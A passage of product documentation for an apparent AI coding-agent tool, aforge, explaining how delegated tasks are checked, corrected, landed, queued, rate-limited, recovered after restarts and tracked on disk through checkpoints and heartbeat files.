manifest at all, and the packet already says so in its own sentence: `this workspace is not
a repository, so there is no diff to read: check the files themselves`.

## What happens when the work is not right yet

When the second look says what is missing, the task gets a **fresh worker in the same
working copy**, the original brief, and the gaps in front of it, word for word. The worker is
asked to close the gaps and nothing else:

```
The work so far stands and is already in this working copy. Do not start it again and do not undo any of it: close the gaps above, and nothing else.
```

The worker is fresh; the working copy is not. The task stays *running* while a round is under
way, and you see one plain line of what is being closed.

**A correction round is attempted by a more capable model.** The first attempt runs on the
task's own model; when a check finds gaps, the worker sent back to close them runs on your
crew's **careful work** model — the `repair` role, in `/crew`. It is the one place aforge
spends more than you asked it to, and it is spent only after something has actually gone
wrong, on a job the check has already narrowed to named gaps in a working copy that is
already most of the way there. Two things turn it off by themselves: a crew whose careful
model is the same as the model the work is on repairs on that model and costs nothing
extra, and a task whose model **you named** — on the card or from inside its room — keeps
your model for the correction round too.

The correction worker is also handed the change as it stands: the files the first attempt
wrote, `git diff --cached --stat` over them, and the sentence that `git diff --cached`
shows the whole thing. It reads the diff rather than the repository.

**How many rounds:** `task.repair_rounds`, default **1**, profile-only. 0 turns correction
off. With the default, a task is worth at most **2 checks and 1 correction worker**.

The person checking is never told it is looking at corrected work — the same packet, the
same contract, no round number. A finding is never re-rolled; asking again until the
answer changes is not checking.

**When it still is not right:** the task lands **failed**, its branch is **kept**, and
anything waiting on it fails with it. The report leads `incomplete — ` followed by the
first gap and then the rest. A later round leads `still incomplete after another go — `,
so three sets of evidence read as three attempts. With nothing said at all, the report is
`incomplete — nothing was said about what is missing`.

The model is told plainly not to quietly spend another task on it:
`what is missing is above and the branch is kept: offer them a follow-up in their own words before anything else is spent on it`

Everything a correction worker and every check spends is folded into the same task's cost,
and the task's elapsed keeps running, because the task never landed.

## What the card says while a task is checked — task says checking what it left, closing gaps what does that mean, why does my task say not done under it, round 1 of 1, sizing the work, the task finished but the card is still busy, my task went quiet after the last line, I sent a message to a task and nothing happened, steered a task and got no reply

A task has several lives and one state. Its worker writes the work; a reading decides
whether the work is handed out in parts; a second look reads what the worker left; a round
closes the gaps that look named. **Every one of them is `running`** — nothing has landed
and nothing was undone between them — so the card, the rail row, the room header and the
home row say which of them it is in:

- `sizing the work` — a reading is deciding whether this job is handed out in parts, and
  how. See *A task that has only just appeared and says sizing the work* below.
- `checking what it left` — the worker is finished and its work is being read.
- `closing gaps · round 1 of 1` — a fresh worker is closing what the look found. The
  second number is `task.repair_rounds` (default 1), so with the default you will only
  ever see `round 1 of 1`.
- Nothing at all while the task is simply working. The row draws what it always drew: the
  call it is inside, its clock, its tokens and its spend.

**Another window sees it too.** A conversation says every few seconds which nodes it has
out and which life each of them is in, so a home row or a switcher row about work running
in a DIFFERENT window says the same words — `1 task running · checking what it left`. Two
things it does not carry: the round numbers, which stay on the window running the work
(another window reads `closing gaps` with no numbers after it), and anything at all from a
window that is gone — a conversation whose file has gone stale draws the row it always
drew, and its work reads `incomplete`.

**Under a round, one dim line says what was found**, in the checker's own sentence with
what happened in front of it:

```
closing gaps · round 1 of 1
not done — go test ./... reports no test files
```

That line is the reason the work is being done again. It takes the row the clock and the
spend would have had, because the clock is true every second and this is not.

**You cannot steer into the check.** The worker has finished reading, so a line typed into
the task's room while it says `checking what it left` is refused with the reason —
`task 3 is being checked — nobody is in there to read your line until the check lands` —
and the steer guard opens over your words instead of pretending they were delivered.
Because the task is still running, the guard offers only two keys: `m` sends your words to
the main conversation, `esc` keeps them in the box (there is no `r` revive here — the work
is not over, and restarting it would make a duplicate). If the check finds gaps, a round
opens with a fresh worker and `enter` steers that worker as usual.

**How long it can take.** Both are full model runs on your work, so minutes each is
normal — a check on a large change has been four minutes, and a round is a second worker
doing the last ten percent of the job. The whole time is on the one task's clock and the
whole cost is on the one task's bill, because you asked for one piece of work.

**If the row says nothing and the clock is still going**, the task is at its own work and
the heartbeat is the thing to read — see the heartbeat section on this page for telling a
working task from a hung one.

## A task that has only just appeared and says sizing the work — task stuck before starting, why is my new task doing nothing, sizing the work how long, task appeared and then nothing happened

`sizing the work` is the one life a task can be in **before its worker has said a word**,
and it is the answer to "a task appeared, the clock is going, and nothing is happening".

It means a model is reading the job and deciding **whether it is handed out in parts, and
how**. It happens in two places:

- **Just after the task appears**, when the work was moved out of a reply that had parts
  in it (`this has parts · handing it to a task that can take them side by side`). Somebody
  has already drawn the parts, and this reading is what decides whether they are admitted.
- **Mid-run**, when a worker has opened the material, found the job wider than one pair of
  hands, and asked to hand it out.

**How long is normal.** It is one full model call on the tier that thinks: **ten to thirty
seconds**, measured at thirteen. It is given at most **three minutes**, and a reading nobody
could get is not a refusal: an ordinary division goes ahead as the worker wrote it, and one
that only this reading could have allowed does not. It carries no numbers — how many parts there are is exactly what it is deciding —
and the roster says what happened afterwards, either `split into 3 parts:` or the task
carrying on as one worker.

**Nothing is wrong if it ends with no parts.** A reading that says the work is one job is
a normal ending: the task runs as one worker, nothing is cancelled, and nothing is lost.

**Cheap refusals draw nothing.** Where a division is turned down without a reading at all —
no lane is free to pick the parts up, or a width floor you turned on says the material names
too few items — the whole thing takes microseconds and no word is drawn for it. Only the reading is a wait,
so only the reading is said.

## What briefing a worker means — briefing a worker, the wait before a handed-over turn becomes a task, aforge froze for thirty seconds, nothing appeared on the rail

When your turn is handed over, the **status line at the bottom says `briefing a worker`**
with a clock counting up beside it, and no task exists yet.

That is the harness writing the instruction the task will open on, and it is two model runs
back to back: the model that spent the turn writes down what it found out, and a second
model turns that into the brief. **Fifteen to thirty seconds is normal.** Nothing is frozen
and `esc` still works. The task appears on the rail the moment the writing ends.

It is worth the wait, and that is the whole reason it exists: a task started without it
opens on your bare sentence and re-derives everything the conversation already knew. What
the writing produces is what the worker reads first — what is left, what is already known,
what has been ruled out, and how anybody could tell when it is done.

**It is a live line, not a note.** It says only what is true while it is true and takes
itself off the screen when the writing ends, because this road can still decide the work
was already finished and leave the turn exactly where it was — in which case no task starts
and no line claims one did.

**It stays up for the whole wait.** The line keeps saying itself while the writing runs, so
a brief that takes thirty seconds is drawn for thirty seconds with one clock counting the
whole of it. It does not go blank partway through and it does not restart at zero.

## The three ways a task can land

Every task ends in exactly one of three states, and the words are the same everywhere you
read them.

**Finished.** `task 7 finished: <title>`. The second look held. The branch merges into an
ordinary checked-out branch, or stays on its task branch when the checkout is protected,
moved or detached. The report leads with the task's own account of the work, with what it
was checked on under it — no lead word at all.

**Halted.** `task 7 lost the connection: <title>`,
`task 7 the model provider refused it: <title>`, `task 7 went in circles: <title>`,
`task 7 was blocked by another task: <title>`, `task 7 ran out of steps: <title>`,
`task 7 would not write its notes down: <title>`. Nothing was found wrong with the work; the
branch is kept and the task can be run again from it. The rail draws these with `!` (see the
section on the words under a stopped task).

**Failed.** `task 7 failed: <title>`. Somebody looked and made a finding — or a limit fired
and the work did not hold when it was checked afterwards. The branch is kept. Anything
waiting on it fails with it. A limit firing on its own is no longer enough: work that was
stopped and then held lands under *finished* above.

**Needs your look.** `task 7 needs your look: <title>`. Nobody could look, or nobody would
say — or the work held and one of the files it wrote moved under it while it ran, which is
its own section below — or the work held and its branch would not merge cleanly, or the
folder it was going to lay its work back over holds an edit of your own in one of those
files — or what
was left of the work turned out to be something no worker can do at all, which lands this
way before a worker is ever started (*A task that landed needing your look without doing
anything*). The task is neither done nor failed: nothing merges, the branch is kept, and nothing
waiting on it fails. The report leads
`finished, but needs your look — ` and then what was said, or
`finished, but needs your look — nobody could say whether it holds` when nothing was said.
The landing then says in as many words that it is neither done nor failed, that its branch
is kept, and that anything waiting on it waits until somebody decides.

The sentences you may see when nobody could say are written plainly:
`the checker could not start: <err>`, `the checker could not be asked: <err>`,
`one call ran 2m30s without answering and was abandoned`,
`nobody could check it in 5m0s`, `the checker answered neither way`. A call that was
asked and hung is always named as that — the sentence about nobody being able to check
is kept for the case it is true of, where the window was too small for a call to be made
at all. The time in it is the window **the check** had — `5m0s` when it had a command to
run, `1m0s` when the work named no check and there was nothing for it to run. It is not
your window and there is nothing you missed: **a question to you is never on a timer.**
That sentence used to read `no answer in 5m0s, so nothing was accepted`, which said two
things a clock is not entitled to say — that you had five minutes, and that a decision had
been made. Nothing is accepted or refused by a window running out; the work waits for you,
for as long as that takes. When two tries in a row got nothing, the first line is prefixed
`asked twice and got no answer either time — `.


The last line of that landing is the only thing the `task.settle` setting changes. With it
on `ask` — the default — the note says the task waits until somebody decides and offers
`tasks id 7 resolve accept|reaudit|refute`, and tells aforge to say what it thinks and leave
the choice with you; the four choices on the landed card are the door. With it on `auto` the
same note tells aforge to read the report and the work and settle the task itself, and to
come back to you only when it genuinely cannot tell. Everything else in the landing is
identical either way.

**A session with nobody watching reads as `auto` whatever the row says.** `aforge --once`
and every other headless door run with no surface to raise a card on, no settings panel and
nobody to read a landing that says it is waiting on somebody — so a task that needs a look
there would stop the run for good, and that was measured stopping a ten-hour run. Such a
session takes the same road your own `[d] decide these for me` takes: aforge reads the
report and the work and settles the task itself, with the same standing escape to say it
cannot tell. It never goes the other way — a session you are sitting in front of keeps the
row you set, and a blank row still means aforge asks you.

**And a run you left going with a budget goes one step further, for the case where nobody
could check the work at all.** On `--yolo` with `--max-hours` or `--max-cost`, a landing
nobody could say anything about is not put to anybody: the check has already been run twice,
there is nobody to ask, and the work is taken as it stands. The landing says so and says
why, under the task's own account of what it did:

```
taken as it stands: one call ran 2m30s without answering and was abandoned · the window closed before a second, and the run is unattended
```

The first part of that is the checker's own account of what became of it, whatever it was —
a call that hung and was cut, a checker that would not start, a reply that said neither way
— so the sentence names what actually happened rather than asserting nobody could check the
work.

The task then reads `finished` and its branch merges like any other. This happens only on a
run with a budget — a `--yolo` run without one, a headless `--once` with no ceiling, and a
task inside another task in a session you are watching all keep the old road, where the
landing goes to whoever holds the decision and they settle it.

## The check was asked twice — checked on the second try, one call ran without answering and was abandoned, why the check was re-run

**No single call may spend the whole checking window.** The check is asked at most twice —
one checker, then a fresh one with the same evidence — so one call may hold at most half the
window, and a stream that answers nothing is abandoned at that point and the check asked
again inside what is left. You may see this on the card:

```
one call ran 2m30s without answering and was abandoned
```

When the second call does answer, the landing is an ordinary finished landing with one line
at the end of its evidence saying which try it was:

```
checked on the second try
```

That is a fact about the evening and not about the work: the check's answer is the same
answer, reached on the same tree, and nothing about the task is different for having taken
two goes.

Sometimes there is no time for a second call: closing one checker and building another
takes some of the window too, and a call that would get less than a tenth of it is not made
at all — a bound that small guarantees the non-answer it would then be blamed for. The card
keeps the first call's account and says why there was no second:

```
one call ran 2m30s without answering and was abandoned · the window closed before a second
```

**Why the bound exists.** Without it, one hung stream could eat the whole five minutes on
its own — measured at 183 seconds on one call, with no refusal and no error — and the check
was then never asked a second time at all, while the task landed saying nobody could check
it in five minutes.

## A task that landed needing your look without doing anything — task did nothing, only I can approve this, my task stopped straight away and says it needs a person

Sometimes a task lands needing your look within seconds, having written nothing, spent
almost nothing and touched no files. That is not a failure and nothing went wrong. It means
what was left of the work is **not work a worker can do**: an approving review only a named
person may give, a credential or an account nobody here holds, a decision that is yours to
make, or a step that is somebody else's system doing something by itself.

It is found by the same `mastermind` model that reads a task's parts before it splits (the
tasks page, *when a task turns out to be too wide for one worker*). That reading happens
**before the task's worker is asked anything**, and when it comes back saying nobody here
can do this, the task stops there rather than starting one. The report is that reading's own
sentence, in its words — `finished, but needs your look — an approving review GitHub will
only accept from a human who isn't the author`, say — so what you are being asked to do is
the first line on the card.

Everything else about the landing is the ordinary needs-your-look landing above: nothing
merges, the branch is kept, nothing waiting on it fails, and the four choices on the card
are the door. Usually the right one is to do the thing yourself and then accept it, or to
say what you want done instead and start the work again.

**Why this exists.** Before it did, a task whose whole remainder was two GitHub approvals
was read correctly, told nobody, and ran anyway: nine minutes and about $1.24 across the
run, the check, a repair round and the check again, spent editing a file in an empty copy
of the repository while it looked for something it could do — and then failed by the check.
The reading that would have saved all of it had already been paid for.

## Why my task needs my look when it finished fine — another window changed the same file

There is a second reason `needs your look` fires, and it has nothing to do with whether the
work is any good. **A task that finished, was checked, and passed will still stop short of
merging if somebody else changed one of the same files while it was running.**

This is the case nothing else can catch. A task opens a file, thinks for twenty minutes,
and writes. If a change landed in that file during those twenty minutes, the work is
correct against a world that stopped being true — and the check cannot see it, because the
check runs inside the task's own working copy, which is a copy of the world as it was when
the task started.

So at the moment the branch would merge, the files the task **wrote** are held up against
two things:

- **what finished in them since this task started** — the project's record of landed work,
  which now names the files behind each row's count;
- **what other windows on this project are writing right now** — the live claims each open
  window publishes about the paths its running work has already touched.

When either overlaps, the task lands `needs your look` instead of `done`. Nothing merges,
the branch is kept, dependents wait, and the four choices on the card are the same ones
described in the tasks page — `accept` merges it the ordinary way once you have looked.

**What the report says.** The first line names the files and, where it can, the work that
changed them. Landed work and a window that is still going get separate sentences, because
they are different facts:

```
finished, but needs your look — "rail permanence" changed internal/tui3/home.go while this ran
finished, but needs your look — "drop-up nearest" is also working in internal/tui3/home.go
```

Work nothing ever named is called `another window is also working in internal/tui3/home.go`.
Long lists stop counting out loud after two — `internal/tui3/home.go, internal/tui3/task.go
and 4 more` — and so do long lists of tasks. The task's own account of what it did stands
underneath, along with what it was checked on.

**What will not trigger it**, on purpose:

- **Work that named no files.** A row written by an older build, and work that genuinely
  wrote nothing, look exactly alike. Neither is treated as overlap — a warning raised on a
  silence would fire constantly and you would learn to ignore the real one.
- **The task's own sub-tasks.** A sub-task branches off its parent's working copy and merges
  back into it, so a child landing in a file its parent also wrote is the design working.
- **Files the other work merely read.** Nothing anywhere records what a task read, so the
  claims are about writes only.
- **A neighbouring file in the same package.** Paths must match exactly; there is no
  directory-level matching and no patterns.
- **Work that finished before your task started.** That is a file your task read, not a file
  that moved under it.

If nothing overlaps, nothing changes: the task merges and lands `done` exactly as it always
did. There is no setting for this and no way to see it before the run — the earlier warning
before a task starts is a separate thing, and it cannot see this case at all.

## A task working on a folder wrote over my own edit — I changed a file while the task ran, my changes disappeared

It does not, and this is the folder's half of what a repository ground gets from git.

A task whose ground is a **plain folder** works in a private copy of it and lays the files
it wrote back over your folder by name when it lands. **A file you changed there yourself
while it worked is never written over.** Nothing at all is laid, the task keeps its whole
copy where it is, and it lands `needs your look`:

`finished, but needs your look — its work is in /Users/you/.aforge/sessions/…/trees/11 and was not laid over /Users/you/notes: notes.md changed there while this ran`

Both versions survive that: yours in your folder exactly as you left it, the task's in the
directory the sentence names, so you can read the two and take what you want. The first few
names are given and the rest counted, as everywhere else.

**What is compared** is your folder as it stood when the task took its copy, against your
folder now, for the files the task actually wrote — and nothing else. A file the task never
touched is yours to edit all day. **Deleting one counts as changing it**: throwing a file
away is something you did on purpose, so the task's version is named rather than put back.

**It does not fire** when your edit left the file holding exactly what the task was going to
write anyway — there is nothing to lose — nor for a task started by a build older than this
one, which lands the way it always did.

**Pressing accept does not change it.** An accept says the work is good, and it is; it
cannot decide which of two versions of your file you meant, so an accept over a folder that
moved leaves the task needing your look with the same sentence.

## Nothing is thrown away

On every ending except a clean merge, the branch is **kept and named**. This is true
without exception:

- a task **stopped at a step limit or for lack of progress** whose work did not hold keeps
  its branch — and what it made is **committed onto that branch** before it lands, so
  `git merge task/…` really brings the files over. The landing note names them under
  `changed:` and offers the merge. (If the check passes, that task merges instead and there
  is no branch left to offer.);
- a task that ran out of time keeps its branch;
- a task you killed with `jobs kill` keeps its branch, and the partial work with it;
- a task whose work was found incomplete keeps its branch, exactly as a killed one does.
  "Not proven" is not "throw it away";
- a task that needs your look keeps its branch;
- a task whose merge conflicted keeps its branch, lands as **needs your look** rather than
  finished, and names the files that changed on both sides. The note adds
  `its branch task/… did not merge cleanly and was kept — merge it yourself when you are ready`;
- a finished task on a protected branch, whose branch or commit moved after the cut, or
  whose checkout became detached,
  stays **done** and keeps its branch for you to merge where you choose;
- a task on a plain folder that would have written over an edit of your own lays **nothing**,
  keeps its whole copy of the folder, lands as **needs your look** and names the files that
  changed there while it ran;
- a task that left files it did not write keeps them too — in its task folder, named in the
  report, never on your branch, after its working copy is given back;
- a session that ended mid-run keeps the branch, and says where it is.

A task that ran **in place** — no repository to branch from — is never described as
aborted, because its edits are already in your tree.

So work is recoverable even when it did not merge. The branch name is in the landing note,
in the checkpoint on disk, and in the project's index of landed work.

## Work that needs your look holds up what depends on it — did my task see all of the earlier tasks' work, why did my task only see part of the earlier task's report, does the task get everything the previous task found

A task can name `depends_on` — ids that must finish first. When it starts, their reports
land in `THE WORK` under `What the work before you learned — N reports:`, then
`<title> (task N):` and the report. `N` is how many are there, so a six-row table can
count.

**Every earlier task is always represented.** Keeping four of six and saying nothing
about the other two is how a sink once wrote a confident four-row table. The list is
never shortened. **The task's own brief is never cut.** The reports share what is left
of a 6000-byte bound after it, equally; unused share goes to whoever still needs it. A
report that does not fit is cut and marked with `…`, so the worker can see it is a
fragment and go read the earlier task's whole report. A report that fits is handed
over unchanged, with no mark. So: no, not every byte — yes, every earlier task.

**A task that depends on finished work kept on a branch starts from that branch.** Its
files are already in the new task's working copy before the worker runs. With several kept
dependencies, their branches are combined first. If they do not merge cleanly, the task
does not start and names every branch you need to combine yourself.

| The task it waits on | What happens |
| --- | --- |
| Finished | It becomes ready and starts when a slot is free |
| Failed | It fails too, with `it waits on task 3, which did not finish` |
| Not in this session's work at all | It fails, with `it waits on task 3, which is not in this session's work` |
| **Needs your look** | It **stays queued** — it does not fail |

A task shown as **incomplete** is still failed for dependency purposes: the check found
work left to do, so anything waiting on it fails with the existing `did not finish`
reason. The new word changes what the person sees about that task, not what the task graph
allows to advance.

**A bad id never gets that far on a new proposal.** `depends_on` takes only ids
`propose_task` itself returned. A job, an adaptive run, a step count, or a task that
already failed is refused on the spot:
`depends_on names task 1 — no task in this session has that id`. The rows above are
for work that goes wrong after admission. Dependents of work that needs your look wait
indefinitely. Dependencies only point backwards — ids ascend — including on reload.

## A task's own sub-tasks are its problem — can I accept a sub-task before its parent finishes, does a sub-task ask me for a look while the parent is running, nested tasks that need a look

A task that hands part of its work out is the one that reads those pieces back. A sub-task's
landing report goes to **its parent task's own worker**, not to this conversation — that
worker has the `tasks` tool, the diff and the brief, and it is the only reader that can fold
the piece into the whole.

**That is about who is asked first, never about whether you may answer.** A sub-task that
lands needing a look is filed under `needs you` on the roster from the moment it lands,
whatever its depth — and its landing card, its roster row and its own room all offer the
answers there and then. You can accept it, send it back for another look, or call it not
right while the task above it is still working. What the parent's running changes is how
LOUD the demand is: while its head is alive the sub-task **folds** under that family, and the
folded row wears its head's own news rather than the `?` the head is already holding.

That fold ends the moment the parent lands. A sub-task still waiting on a decision when its
parent settles has nobody left reading its news, so it is handed up one level — to the
grandparent's worker if there is one, and to this conversation if there is not — with the
line `task 4 has finished, and a piece of work it handed out is still waiting on somebody to
decide:` and then the sub-task's own landing under it. Nothing about its row moves: it was
already `needs you`, and now the question is plainly yours.

What this means in practice: **the fold is a volume, not a mute.** One job with six pieces
in it does not read as six demands while it is running, and nothing quietly rots underneath
a task that went home.

## Choosing which model a task runs on

You say it in the conversation, in words: "use opus for this one". The model then puts the
`model` argument on `propose_task`. There is no key, command or field you type directly.

The word may be a whole catalog id (`anthropic/claude-opus-5`), the tail after the vendor
(`claude-opus-5`), or any set of tokens found in one id (`opus 5`, `opus-5`). Case,
surrounding space and a leading OpenRouter `~` are ignored.

Matching tries three rungs in order, and the first that answers wins: the **whole id**
exactly (so `openai/gpt-5` is never read as part of `openai/gpt-5-mini`); the **tail** after
the vendor; then **every token** appearing anywhere in an id, sorted shortest id first,
ties alphabetically — the plain name before its variants.

**One match** is just used. Nobody is asked, and the receipt reads
`task 7 started on anthropic/claude-opus-5: <title>`.

**Two to four matches** get settled by you, on the proposal you are already being shown.
The closest match leads, and that is what silence takes. Only a member of that shortlist
can win: naming anything else, an empty answer, and the clock all fall back to the leading
member. The task is admitted with one model, never a set. The shortlist is capped at 4 —
the fifth would turn a proposal into a picker.

**If no model was named**, the task runs on `task.model` from settings when that is set,
otherwise on **the model the conversation was on at the moment the task was admitted**.
The id is settled then and **frozen against drift** — a `/model` after that moves the
conversation and never the work already handed over, so a task that sat in the queue
starts on the model you launched it with rather than on whatever you have switched to
since. A task groomed *before* the switch keeps the old model; one started after it gets
the new one.

**Frozen against drift is not frozen against you.** The one deliberate way to move a
running task off its id is to walk into that task's room and press the model's name at
the bottom of the screen: the picker opens aimed at that task, and choosing moves that
task from its next turn onward — the conversation and every other task are untouched. A
task that has already landed is refused, in the words `task 7 is done, not running`. The
tasks page has the whole of it under "Changing the model for one task while it is
running".
`task.model` is profile-only: a repository must not be able to send your work and your
credit to a model you never picked. Blank means the conversation's own model.

**This is a promise about the task, not about everything under it.** A task can start work
of its own, and each of those settles its own model when *it* is admitted — the only id
anybody can be told up front is the one the task you asked for is running on. The one
thing that can move a task off its frozen id is a model with **no tool use**: a task
cannot run without tools, so aforge swaps once to the small-work class and says so on the
row — `model <id> has no tools; using <other>` — and from then on the row names the model
it is really on.

The receipt only names a model when the `model` argument was given. A task that named no
model is not told which default it got.

## When aforge refuses a model name

Two refusals, both ordinary tool results the model can retry from in one round trip.

**No model by that name.** With near matches — ids sharing at least one token, shortest
first, at most four:

```
no model here is called "opos-5" — did you mean anthropic/claude-opus-5, anthropic/claude-opus-5-thinking? Name one of those, or leave model out to run on <default id>.
```

With no overlap at all — a word like "fast" or "cheap":

```
no model here is called "fast". Name a model id the person has, or leave model out to run on <default id>.
```

`<default id>` is what the task **would** run on if the argument were left out.

**Too many matches.** More than four candidates is not a shortlist, it is a list:

```
"claude" matches several models — say which: a, b, c, d.
```

The four named are the first four candidates, shortest id first.

**When nothing can say which models exist**, there is no refusal at all. An empty list is
"nobody can say", not "there are none": the word is taken exactly as written and the
provider answers for it. This is what happens in the first seconds of a session, while the
catalog is still warming — a `model` argument used then is passed through unchecked.

Once resolved, the model is remembered for the task's whole life: on the proposal, on
every update, and in the checkpoint on disk, so it survives a restart. A checkpoint from
an older build carries none, and the task reads as "the conversation's own".

## How many tasks run at once

By default, **no limit**. `task.parallel` is 0 (blank) out of the box, and 0 means no cap.

A cap, if you set one, is a **queue and never a refusal**: a ready task past the cap sits
and starts when a slot frees.

The real ceiling is the machine. Before each scheduling pass, aforge asks whether one more
task may start:

| Setting | What it reads | Default | Effect |
| --- | --- | --- | --- |
| `task.max_load` | one-minute load average divided by core count, from `/proc/loadavg` | **1.5** per core | at or above it, no new task starts |
| `task.min_free_mb` | `MemAvailable` (not free memory) from `/proc/meminfo`, in MiB | **1536** (1.5 GiB) | below it, no new task starts |

Either one set to 0 turns that check off. Readings are cached for **1 second**. When a
task is held back this way it is re-asked every **5 seconds** — a machine getting quieter
is not an event, so it has to be looked at on a clock.

This gates **starts only**. Nothing already running is ever touched; pressure drains as
running tasks finish.

**The honest caveat:** these two governors read `/proc`, so they only work on Linux. On
macOS and Windows there is no `/proc`, the machine cannot say, and silence is never
treated as a hold — those platforms get no pressure gating at all, and `task.max_load` and
`task.min_free_mb` do nothing there.

A running task whose provider call is being paced reports that it is rate limited. That is
a count, not a flag: a task can have a correction worker and a checker out at once, and it
stops being paced when the last of them gets through — or when its patience runs out, which
the next section spells.

`task.parallel`, `task.max_load` and `task.min_free_mb` are all profile-only settings.

## Rate limited — why work waits, how long it waits, and why things stay slow after

When the provider answers **too many requests**, that is not a failure. It is the provider
saying *not yet*, and aforge waits rather than throwing the work away.

**What the wait looks like.** The first retry comes after about **0.7 seconds**, and each
one after that doubles — but no single wait is ever longer than **one minute**, whatever
asked for it. If the provider sent its own comeback time, that time is used instead when
it is longer, still under the one-minute ceiling. A task whose call is waiting shows
`waiting · rate limited` on its row for as long as it is held.

**How long patience lasts.** Two clocks, and whichever runs out first ends the call:

| Whose call | Attempts | Time spent waiting |
| --- | --- | --- |
| your conversation's turn | 6 | 2 minutes |
| a task's own calls | 60 | 10 minutes |

A turn you are watching gives up sooner on purpose: an error you can act on beats a cursor
that never comes back. A task waits far longer because nobody is sitting in front of it and
a working copy of real work is behind it — but it does give up in the end. Ten unbroken
minutes of pacing is not a burst; it is an account that cannot serve the work right now,
and a task that says so is more use than one that sits. When patience runs out the call
fails with the provider's own words, the turn is retried three more times as any provider
failure is, and then it surfaces as a failure like any other. A request that was **cut**
rather than refused — a model that went quiet, a reply that came apart — has a budget of
its own and does not spend any of those three (see *Models, context, and what it costs*).

**Routing around a full pool.** Some *too many requests* answers name which upstream
provider's pool is full — one machine room out of the several that can serve the same
model. When that happens, aforge remembers the name and asks the router to route new
calls around that provider for the next five minutes (or for the comeback time it named,
if shorter), so fresh work lands on machines with room instead of queueing behind the
full one. The call that drew the answer still waits its own wait — only calls sent after
it steer around. A model served by a single provider has nowhere else to go, and simply
waits as described above.

**Why things can stay slow afterwards.** aforge watches how many calls the provider will
take at once and pulls that number in half when it is told *too many requests* — once per
burst, not once per answer. It gives it back on the clock: after **20 seconds** with no
further pacing, one call's worth returns every **5 seconds** until it is back where it
started. So a burst costs a few minutes of reduced throughput, not the rest of the session.
This matters most when several aforge windows share one API key: the pacing one of them
causes is charged to all of them, and without the healing every window would ratchet down
and stay there.

## Does a task survive a restart?

The graph survives. The running work does not.

When a session comes back:

- tasks that were **done**, **failed**, **needing your look** or **queued** come back
  exactly as they were, with their leavings intact;
- a task that was **running** comes back **queued** and marked interrupted, and it is
  resumed once — a process exit pauses work, it does not make a finding about it. Its
  report says where its work is:
  - `paused — it resumes; branch task/… kept` — plus `, its working copy is at <dir>` when the
    directory is still there. The branch is checked in the repository first;
  - `paused — its previous branch task/… is gone, so it resumes in a fresh working copy`;
  - `paused — it resumes`, when it had not got as far as a working copy;
  - `paused — it resumes; whatever it wrote is in your tree`, when it worked directly in
    the workspace;
- **a sub-harness design that was still being written is the exception: it does not
  resume.** It comes back **failed**, saying `the design did not finish before aforge
  closed; nothing was saved`, and it is never handed to an ordinary worker. Nothing reaches
  the harness registry until you approve the card, so an unfinished design left nothing
  behind to pick up — ask for it again and it is designed from the start;
- then the queue is turned again: a queued task whose prerequisites are still done starts
  now.

You see one line about it, as context for your first turn rather than as a reason to start
one:

```
recovered task graph: 2 done · 1 interrupted (branch task/fix-it-9c1a2f kept) · 1 waiting
```

The counts are done, failed, needing a look, interrupted, designs that did not finish, and
waiting. A design's own clause is `1 design did not finish (nothing saved)`. The branch
clause reads `no branch kept`, `branch X kept` or `branches X, Y kept`. Any completion notes
that were never delivered appear underneath.

**An adaptive run is not a task and does not come back at all** — it has no checkpoint.
What comes back is its row in the project's list, closed with `incomplete — aforge closed
while this was still running`. See *Adaptive runs*.

A completion is announced **exactly once across lives** — a resumed session does not
re-tell the model about work it already read about.

## Where task state is written on disk

Four places.

**The checkpoint**, one per conversation, in the conversation's own folder:

```
~/.aforge/v3/projects/<workspace-with-dashes>/<session id>/tasks.json
```

It holds the id counter and, per task in admission order: id, title, summary, brief,
acceptance, depends_on, state, report, the task's own claim, changed files, branch, the
directory it worked in and which copy of your folder that was, merge outcome, model,
`max_steps`, `no_progress`, elapsed, and whether it has been noted or was interrupted.

**What each node cost is in it too** — the money, tokens in and out, cache read and cache
write — so a conversation reopened tomorrow still shows what every task spent. Nothing is
invented on the way back in: each figure was written down when the node settled, and the
requests behind it are the `usage` lines in that node's own task transcript, which you can
open and read. The assembled brief is not in it; it is rebuilt from the prerequisites'
reports when a task starts.

It is written after **every** transition, atomically, never only at exit. On load it is
schema-checked, and **any** violation drops the file whole and starts the session with no
graph rather than refusing to start.

A conversation with **no session file on disk** gets no checkpoint at all, and runs tasks
anyway.

**The project index**, one per workspace, shared by every window open on that project:

```
~/.aforge/v3/projects/<workspace-with-dashes>/tasks.jsonl
```

Append-only, one row per landed task: id, name, label, title, status, the first sentence
of the outcome, file count, cost, the model it ran on, its tokens in and out as one sum,
duration, when it ended, the session id, and two URIs — where the work is and where the
transcript is. Never the content: it is an index, not an archive. A read keeps the newest
2000 rows.

An adaptive run writes **two** rows for the run itself: one when it starts, saying only
that it is running, and one when it ends, carrying the whole tank it spent, the planner's
model and how it finished. Rows are never edited — the newest row for an id is the one
that counts — so the closing row's cost minus its nodes' costs is what the planning and
the closing write-up cost on their own.

**Task transcripts**, which are real, resumable session files you can open with `read`:

```
~/.aforge/v3/tasks/<session id>/<YYYYMMDD-HHMMSS>_<task id>.jsonl
```

Beside each one sit `…_<id>-audit-<6 hex>.jsonl` per check and `…_<id>-repair1.jsonl` per
correction round. A task's own pointer stays on the **first** file — the run that is the
task itself. A conversation that has a session folder keeps them inside it instead, under
`<session folder>/tasks/`, and that pointer is written on the conversation's task
checkpoint, which is what lets a finished task's room replay its transcript after a
restart.

## The heartbeat — telling a working task from a hung one, is my task still alive, why does the file keep changing

The checkpoint is written when a task is **admitted** and when it **lands**, and a task can
spend eleven minutes between those two moments. From outside the process that leaves
`"state": "running"` and nothing else, so a task calling a model every twenty seconds and a
task wedged on a build that will never return look identical.

**So every running task writes its own heartbeat**, one small file per task, beside its
transcript:

```
<session folder>/tasks/<task id>.beat.json
```

The running task's row in `tasks.json` names the file in a `beat` field, so anything that
already has the checkpoint open can find it without guessing.

It holds:

| field | what it says |
| --- | --- |
| `phase` | `working`, `sizing`, `checking` or `repairing` — which of the task's lives this is |
| `request_started` | when its last model request went out |
| `request_finished` | when that request came back; earlier than `request_started` means one is in flight |
| `requests` | how many requests the task's workers, checkers and repair rounds have made between them |
| `started` | when the task itself began |
| `updated_at` | when the file was last written |

**It is written at every model request boundary** — the cadence of the work itself, not a
clock. There is no ticker, so a task that is genuinely wedged writes nothing new, and that
is the news: a `request_started` four minutes old with no finish beside it is a task inside
one long call, and a `request_finished` four minutes old with nothing since is a task inside
one long command.

**The file goes away when the task lands**, because the checkpoint's own row is the answer
from then on. A process that is killed removes nothing, so a heartbeat left behind is
believed only by its age — the same bargain the session's presence file makes.

